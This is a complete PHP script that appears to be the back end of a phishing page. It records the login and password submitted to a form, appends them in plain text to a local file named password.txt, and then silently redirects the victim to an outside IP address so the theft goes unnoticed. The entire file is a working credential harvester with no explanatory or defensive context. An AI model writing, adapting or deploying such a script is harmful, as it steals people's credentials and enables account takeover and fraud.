<?php

$var1 = $_POST["login"] . "\n";
$var2 = $_POST["password"] . "\n";

$arquivo = fopen("password.txt","a");

$armazena1 = fwrite($arquivo, $var1);
$armazena2 = fwrite($arquivo, $var2);
fclose($arquivo);

header("Location: http://37.59.174.228/erp");
?>
